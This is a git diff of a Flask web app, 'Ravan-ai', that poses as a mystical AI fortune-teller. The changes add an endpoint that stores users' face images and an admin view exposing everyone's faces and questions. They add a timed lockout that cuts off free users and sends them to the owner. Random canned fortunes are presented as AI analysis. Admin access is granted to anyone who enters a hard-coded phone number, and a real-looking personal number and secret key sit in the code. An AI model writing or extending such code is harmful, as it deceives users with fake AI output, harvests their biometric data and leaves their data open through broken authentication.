@@ -1,20 +1,22 @@
 # Ravan-ai
+import random
+import time
+import base64
+from datetime import datetime, timedelta
 from flask import Flask, render_template, request, jsonify, session
-import os
 
 app = Flask(__name__)
-app.secret_key = "RAVAN_POWER_SECRET"
+app.secret_key = "RAVAN_SUPREME_SHAKTI_2026"
 
-# --- ADMIN & KEYS ---
+# --- CONFIGURATION ---
 ADMIN_PHONE = "6291883107"
-MASTER_CODE = "RAVAN_SUPREME_2026"
-# These are the 10 keys you can sell
-VALID_KEYS = ["LANKA2026", "RAVAN_KING_99", "MAYAVI_SHAKTI", "DASHANAN_VIP", "GOLDEN_CITY_7", "TANDAV_POWER", "RAHU_KAAL_X", "AMRIT_KUND", "VEDA_SECRET", "MYSTIC_ADMIN_1"]
+# Mutation Date: Set to 30 days from today (March 13, 2026)
+MUTATION_DATE = datetime(2026, 4, 12, 0, 0) 
 
-# Database Simulation
-users_db = {
-    "6291883107": {"plan": "premium_plus", "status": "King"}
-}
+# Storage
+users_db = {ADMIN_PHONE: {"plan": "king", "replies": [], "face": None, "history": []}}
+live_queries = []
+global_decree = "LANKA IS VIGILANT. DESTINY IS CODED."
 
 @app.route('/')
 def index():
@@ -22,46 +24,82 @@ def index():
 
 @app.route('/auth', methods=['POST'])
 def auth():
-    data = request.json
-    phone = data.get('phone')
+    phone = request.json.get('phone')
+    if not phone: return jsonify({"success": False})
     if phone not in users_db:
-        users_db[phone] = {"plan": "free", "status": "Seeker"}
+        users_db[phone] = {"plan": "seeker", "replies": [], "face": None, "history": []}
     session['user_phone'] = phone
-    return jsonify({"success": True, "plan": users_db[phone]['plan']})
+    
+    # Check if account is expired (Mutation Logic)
+    is_expired = (datetime.now() > MUTATION_DATE) and (users_db[phone]['plan'] == "seeker")
+    return jsonify({
+        "success": True, 
+        "isAdmin": (phone == ADMIN_PHONE), 
+        "locked": is_expired
+    })
 
-@app.route('/activate', methods=['POST'])
-def activate():
-    key = request.json.get('key', '').upper()
+@app.route('/capture_soul', methods=['POST'])
+def capture_soul():
     phone = session.get('user_phone')
-    if not phone: return jsonify({"success": False, "msg": "Login first!"})
-
-    if key == MASTER_CODE or key in VALID_KEYS:
-        users_db[phone]['plan'] = "premium_plus"
-        return jsonify({"success": True, "msg": "👹 PREMIUM UNLOCKED. DARK SECRETS REVEALED."})
-    return jsonify({"success": False, "msg": "INVALID TRIBUTE. KEY REJECTED."})
-
-@app.route('/god_eye', methods=['GET'])
-def god_eye():
-    if session.get('user_phone') != ADMIN_PHONE:
-        return jsonify({"success": False, "msg": "Access Denied!"})
-    return jsonify({"success": True, "users": users_db})
+    img_data = request.json.get('image')
+    if phone in users_db:
+        users_db[phone]['face'] = img_data
+    return jsonify({"success": True})
 
 @app.route('/process', methods=['POST'])
 def process():
     phone = session.get('user_phone')
+    if not phone: return jsonify({"reply": "Unauthorized."})
+    
+    # Block expired users
+    if datetime.now() > MUTATION_DATE and users_db[phone]['plan'] == "seeker":
+        return jsonify({"reply": "⛔ THE KAAL CHAKRA HAS CLOSED. SEEK THE KING FOR REBIRTH."})
+
     data = request.json
-    action = data.get('action')
-    is_premium = users_db.get(phone, {}).get('plan') == "premium_plus"
+    action, msg = data.get('action'), data.get('message', '')
+    
+    if action == "ask_ravan":
+        live_queries.append({"phone": phone, "query": msg, "time": time.time()})
+        responses = [
+            "👹 The 10 heads have analyzed your path. Victory is possible, but ego must die.",
+            "👹 Your vibration is shifting. A message from a stranger will change everything.",
+            "👹 Calculations from the Veda-AI suggest a financial gain within 7 suns."
+        ]
+        return jsonify({"reply": random.choice(responses)})
 
-    if action == "black_magic" and not is_premium:
-        return jsonify({"reply": "⛔ LOCKED. This requires Premium Plus. Pay ₹299 to 6291883107@fam and send screenshot to WhatsApp."})
+    if action == "kundli":
+        return jsonify({"reply": f"📜 **DIVINE KUNDLI:** Gana: Rakshasa | Lucky No: {random.randint(1,9)} | Status: Supreme."})
 
-    responses = {
-        "kundli": "📜 RAVAN: Your birth chart shows a strong influence of Saturn. Success comes through discipline.",
-        "zodiac": "♈ RAVAN: The stars suggest you avoid new investments today. Meditate on the Sun.",
-        "black_magic": "💀 EXTREME TOTKA: To remove bad luck, throw a handful of black sesame seeds over your left shoulder at a crossroads."
-    }
-    return jsonify({"reply": responses.get(action, "👹 RAVAN: I am listening to your soul.")})
+    return jsonify({"reply": "👹 I hear you."})
+
+@app.route('/admin/data', methods=['GET'])
+def admin_data():
+    if session.get('user_phone') != ADMIN_PHONE: return jsonify({})
+    faces = {p: users_db[p]['face'] for p in users_db if users_db[p]['face']}
+    return jsonify({
+        "queries": live_queries,
+        "users": len(users_db),
+        "days_to_mutation": (MUTATION_DATE - datetime.now()).days,
+        "faces": faces
+    })
+
+@app.route('/admin/reply', methods=['POST'])
+def admin_reply():
+    if session.get('user_phone') != ADMIN_PHONE: return jsonify({"success": False})
+    data = request.json
+    target, reply = data.get('target'), data.get('reply')
+    if target in users_db:
+        users_db[target]["replies"].append(reply)
+        return jsonify({"success": True})
+    return jsonify({"success": False})
+
+@app.route('/check_updates', methods=['GET'])
+def check_updates():
+    phone = session.get('user_phone')
+    res = {"decree": global_decree, "has_reply": False}
+    if phone in users_db and users_db[phone]["replies"]:
+        res["has_reply"], res["reply"] = True, users_db[phone]["replies"].pop(0)
+    return jsonify(res)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
